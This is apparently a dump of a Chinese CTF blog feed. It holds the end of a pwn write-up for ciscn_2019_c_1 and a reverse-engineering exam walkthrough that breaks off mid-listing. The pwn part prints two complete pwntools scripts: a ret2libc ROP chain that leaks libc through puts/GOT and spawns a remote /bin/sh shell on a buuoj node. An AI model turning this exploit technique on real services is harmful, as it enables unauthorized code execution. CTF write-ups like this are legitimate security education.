rdi|ret</code>的地址作为返回地址，某个库函数（这里我们选用的是gets函数）在got表中的地址，以及puts函数在plt表中的地址，最后还需要加上main函数或encrypt函数的地址。<br>我们接收地址值后，还需要知道libc的版本（因为不同libc可能偏移量有区别），才能计算出system函数的真实地址。LibcSearch算出的libc版本没一个是对的（全是古早版本的libc，可能是姿势不对，我看网上有大佬利用分页机制导致libc后3位恒不变的原理来找，我只能%%%），最终一个一个试出来了，<a href="http://xn--libc-2-h02m.27.so">是libc-2.27.so</a>。<br>最终构造第二个payload拿shell，填充数据与上一个payload一致，分别传入retn的地址（维护堆栈平衡，高版本ubuntu需要关注这一点），<code>pop rdi|ret</code>地址，'/bin/sh’的地址，system函数的真实地址，这道题就解决了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26838</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 0x4006e0</span></span><br><span class="line">gets_gotplt = elf.got[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x602050</span></span><br><span class="line">vul_fun = elf.symbols[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span> +p64(pop_rdi_ret) + p64(gets_gotplt) + p64(puts_plt) + p64(vul_fun)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">re = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_gets = u64(re+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(re)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_gets))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;gets&quot;,libc_gets)</span></span><br><span class="line"><span class="comment">#print(libc)</span></span><br><span class="line"></span><br><span class="line">libc_base = libc_gets - libc.symbols[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x800b0</span></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line"><span class="comment"># 添加retn的地址是为了维护堆栈平衡</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> +p64(ret)+p64(pop_rdi_ret) + p64(libc_sh) + p64(libc_system)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这个脚本也可以运行，两个脚本思路上没有什么区别，只是在第一次发送payload后返回的函数不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26838</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 0x4006e0</span></span><br><span class="line">gets_gotplt = elf.got[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x602050</span></span><br><span class="line">vul_fun = elf.symbols[<span class="string">&#x27;encrypt&#x27;</span>] </span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span> +p64(pop_rdi_ret) + p64(gets_gotplt) + p64(puts_plt) + p64(vul_fun)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">re = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_gets = u64(re+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(re)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_gets))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;gets&quot;,libc_gets)</span></span><br><span class="line"><span class="comment">#print(libc)</span></span><br><span class="line"></span><br><span class="line">libc_base = libc_gets - libc.symbols[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x800b0</span></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> +p64(ret)+p64(pop_rdi_ret) + p64(libc_sh) + p64(libc_system)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;755b33e4-bac4-44bb-86ca-ff251d10ae56&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022逆向期末试题</title>
      <link href="/2022/07/re2022/"/>
      <url>/2022/07/re2022/</url>
      
        <content type="html"><![CDATA[<p>这课给分真离谱。</p><h2 id="cpp-1">cpp.1</h2><p>是RC4算法。易得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始密钥0x0FC,0x0FB,0x3B,0x0D,0x73,0x6E</span><br><span class="line">byte_42C700为0x6E,0x65,0x11,0x0CF,0x1D,0x80,0x3B,0x4E,0x20,0x2A,0x0E0,0x0B6,0x0</span><br></pre></td></tr></table></figure><p>使用解密程序进行解密，得到<code>Network</code>。<br>本题需要分析的地方没有结束。先将一些地址信息列在此处。var_1F4为我们加密所得字符串存储的地址，var_64为我们输入的字符串存储的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_64]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">push    0Ch             ; size_t</span><br><span class="line">lea     ecx, [ebp+var_64]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">lea     edx, [ebp+var_C8]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">add     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+var_1F4]</span><br><span class="line">push    eax             ; int</span><br><span class="line">lea     ecx, [ebp+var_C8]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    sub_40100A</span><br><span class="line">add     esp, 8</span><br><span class="line">push    7               ; size_t</span><br><span class="line">lea     edx, [ebp+var_58]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">lea     eax, [ebp+var_12C]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>下面的代码要求将var_12C处字符串与byte_42C600进行异或，byte_42C600处字符串为<code>Notgood</code>，并使用strcpy将其复制到var_1E8处。var_12C处存储字符串与var_58处存储字符串相同，又因为var_58与var_64地址差12个字节，所以我们可以认为下列代码是对我们输入的字符串从第13字节开始进行处理。var_1E8与var_1F4也差12个字节，所以我们可以知道，var_1F4，即我们加密明文所得的字符串，只保留前12个字节，从第13字节开始，保留的是var_12C处字符串与byte_42C600进行异或的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_25C], 7</span><br><span class="line">jge     short loc_411C98</span><br><span class="line">mov     edx, [ebp+var_25C]</span><br><span class="line">movsx   eax, [ebp+edx+var_12C]</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42C600[ecx]</span><br><span class="line">xor     eax, edx</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">mov     [ebp+ecx+var_258], al</span><br><span class="line">jmp     short loc_411C53</span><br><span class="line">loc_411C53:</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">add     ecx, 1</span><br><span class="line">mov     [ebp+var_25C], ecx</span><br><span class="line">loc_411C98:             ; size_t</span><br><span class="line">push    7</span><br><span class="line">lea     edx, [ebp+var_258]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">lea     eax, [ebp+var_1E8]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">add     esp, 0Ch</span><br><span class="line">mov     [ebp+var_25C], 0</span><br><span class="line">jmp     short loc_411CCB</span><br></pre></td></tr></table></figure><p>判断的逻辑是要求我们将var_1F4地址处开始的13个字符与byte_42C700的前13个字符进行比较。var_1F4前12字节是RC4加密得到的，我们取出byte_42C700前12个字节进行解密，即我们之前求得的<code>NetworkClass</code>，byte_42C700的第13个字节为0x0，我们将它与byte_42C600第一个字节进行异或，求得我们输入的字符串第13个字符应该为<code>N</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_411CCB:</span><br><span class="line">cmp     [ebp+var_25C], 13h</span><br><span class="line">jge     short loc_411D16</span><br><span class="line">mov     edx, [ebp+var_25C]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte ptr [ebp+edx+var_1F4]</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42C700[ecx]</span><br><span class="line">cmp     eax, edx</span><br><span class="line">jz      short loc_411D14</span><br></pre></td></tr></table></figure><p>综上，得到flag为<code>NetworkClassN</code>。</p><h2 id="cpp-2">cpp.2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea     edx, [ebp+var_444]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_454], eax</span><br><span class="line">cmp     [ebp+var_454], 5</span><br><span class="line">jnb     short loc_401D56</span><br></pre></td></tr></table></figure><p>要求输入长度为大于等于5个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_450]</span><br><span class="line">movsx   eax, [ebp+edx+var_444]</span><br><span class="line">cmp     eax, 41h</span><br><span class="line">jl      short loc_401DA5</span><br><span class="line">mov     ecx, [ebp+var_450]</span><br><span class="line">movsx   edx, [ebp+ecx+var_444]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jle     short loc_401DBF</span><br></pre></td></tr></table></figure><p>要求输入的字符再0x41到0x7A的范围内，包含了大小写字母和部分特殊符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdata:0042801C dword_42801C    dd 428A2F98h</span><br><span class="line">.rdata:00428020                 db  91h ; </span><br><span class="line">.rdata:00428021                 db  44h ; D</span><br><span class="line">.rdata:00428022                 db  37h ; 7</span><br><span class="line">.rdata:00428023                 db  71h ; q</span><br></pre></td></tr></table></figure><p>可知为SHA-256。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    4</span><br><span class="line">lea     eax, [ebp+var_444]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">lea     ecx, [ebp+var_44C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>说明只对前四个字节进行处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_450]</span><br><span class="line">movsx   ecx, [ebp+eax+var_44]</span><br><span class="line">add     ecx, 1</span><br><span class="line">mov     edx, [ebp+var_450]</span><br><span class="line">mov     [ebp+edx+var_44], cl</span><br><span class="line">jmp     short loc_401E08</span><br></pre></td></tr></table></figure><p>会对所得密文的每一位进行加1操作。<br>所得结果与<code>1f2e28649c4g:25:8bb:24c3D3EGF6GFg22dff</code>进行比较。<br>解的前4字节为<code>Seey</code>，后面需添加至少一个符合输入范围要求的字符。</p><h2 id="cpp-3">cpp.3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea     ecx, [ebp+var_14]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_18], eax</span><br><span class="line">cmp     [ebp+var_18], 8</span><br></pre></td></tr></table></figure><p>要求输入长度为8个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_14]</span><br><span class="line">and     edx, 7Eh</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">and     ecx, 80h</span><br><span class="line">sar     ecx, 7</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">and     ecx, 1</span><br><span class="line">shl     ecx, 7</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_14], dl</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_14]</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, byte_429A38[eax]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_14], dl</span><br><span class="line">jmp     short loc_401085</span><br></pre></td></tr></table></figure><p>主要逻辑是取出每一字节的最高位和最低位，对两个位进行对调，再与byte_429A38进行异或。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, byte_429A30[edx]</span><br></pre></td></tr></table></figure><p>所得结果与byte_429A30进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">byte_429A38为0x6,0x7,0x8,0x9,0x0A,0x0B,0x0C,0x0D</span><br><span class="line">byte_429A30为0x52,0x0C7,0x0C2,0x0CD,0x0EE,0x0EB,0x0FE,0x0F5</span><br></pre></td></tr></table></figure><p>解密得flag为<code>TAKEeasy</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x6</span>,<span class="number">0x7</span>,<span class="number">0x8</span>,<span class="number">0x9</span>,<span class="number">0x0A</span>,<span class="number">0x0B</span>,<span class="number">0x0C</span>,<span class="number">0x0D</span>]</span><br><span class="line">b = [<span class="number">0x52</span>,<span class="number">0x0C7</span>,<span class="number">0x0C2</span>,<span class="number">0x0CD</span>,<span class="number">0x0EE</span>,<span class="number">0x0EB</span>,<span class="number">0x0FE</span>,<span class="number">0x0F5</span>]</span><br><span class="line">c = []</span><br><span class="line">mid = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">mid = a[i]^b[i]</span><br><span class="line">mid = ((mid &amp; <span class="number">0x80</span>) &gt;&gt; <span class="number">7</span>) | ((mid &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">7</span>) | (mid &amp; <span class="number">0x7E</span>)</span><br><span class="line">c.append(<span class="built_in">chr</span>(mid))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><h2 id="cpp-4">cpp.4</h2><p>简单的花指令。主要是我比较SB，脑子抽了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmp     dword ptr [ebp-8], 0Eh</span><br><span class="line">jge     short loc_4010F5</span><br><span class="line">mov     ecx, [ebp-8]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42CCBC[ecx]</span><br><span class="line">xor     edx, 0FFh</span><br><span class="line">mov     eax, [ebp-8]</span><br><span class="line">mov     byte_42CCBC[eax], dl</span><br><span class="line">mov     ecx, [ebp-8]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42CCBC[ecx]</span><br><span class="line">mov     eax, [ebp-8]</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">mov     cl, byte_429A30[eax]</span><br><span class="line">sub     edx, ecx</span><br><span class="line">mov     eax, [ebp-4]</span><br><span class="line">add     eax, edx</span><br><span class="line">mov     [ebp-4], eax</span><br><span class="line">jmp     short loc_4010AA</span><br></pre></td></tr></table></figure><p>主要逻辑是将42CCBC处（根据前面的代码可以很容易的分析出这里存储的是我们输入的字符串）先取反（与0xFF异或的等价操作，我分析的时候没有看到）与429A30处字符串相减。将结果存入var_4中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">429A30处字符串为0xBD,0x9A,0x9E,0x8B,0xD5,0xCF,0x92,0x96,0x9C,0x8D,0x90,0x91,0xD5,0xDE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> loc_4010F5:</span><br><span class="line">.text:004010F5 33 C0              xor     eax, eax</span><br><span class="line">.text:004010F7 74 03              jz      short near ptr loc_4010FB+1</span><br><span class="line">.text:004010F9 75 00              jnz     short $+2</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB  loc_4010FB:</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB E9 83 7D FC 00     jmp     near ptr 13C8E83h</span><br></pre></td></tr></table></figure><p>0x4010FB处jmp指令指向一个无效地址。0x4010F7的jz指令是跳转到0x4010FB的下一字节，因为xor eax,eax语句计算结果恒为零，所以jz跳转一定会发生，而我们程序执行结果不变的情况下，很容易看出0x4010FB处的一个字节是垃圾数据，只需要将其nop掉即可。我们直接通过Patch将0x4010FB处的一个字节修改为90，从而将其修改为nop。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:004010F5 33 C0         xor     eax, eax</span><br><span class="line">.text:004010F7 74 03         jz      short loc_4010FC</span><br><span class="line">.text:004010F9 75 00         jnz     short $+2</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB                         </span><br><span class="line">loc_4010FB:</span><br><span class="line">.text:004010FB 90            nop</span><br><span class="line">.text:004010FC</span><br><span class="line">.text:004010FC                         </span><br><span class="line">loc_4010FC:</span><br><span class="line">.text:004010FC 83 7D FC 00   cmp     dword ptr [ebp-4], 0</span><br><span class="line">.text:00401100 75 0F         jnz     short loc_401111</span><br></pre></td></tr></table></figure><p>修改后的代码如上。对于<code>cmp     dword ptr [ebp-4], 0</code>这条语句，我本来准备直接爆破，后来发现字符串直接取反就行了（乐）。<br>flag为<code>Beat*0micron*!</code>。</p><h2 id="cpp-5">cpp.5</h2><p>如果用ida的graph view很容易看出是异常处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">loc_4014AC:</span><br><span class="line">cmp     [ebp+var_1C], 5</span><br><span class="line">jge     short loc_4014F6</span><br><span class="line">loc_4014F6:</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">mov     ecx, [ebp+var_1C]</span><br><span class="line">sub     ecx, 5</span><br><span class="line">mov     eax, 1</span><br><span class="line">cdq</span><br><span class="line">idiv    ecx</span><br><span class="line">test    eax, eax</span><br><span class="line">jz      short loc_40151E</span><br></pre></td></tr></table></figure><p>jge进行跳转，当jge初次跳转时，var_1C处值为5，ecx减去5后为0，调用除法指令会出现除零异常。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 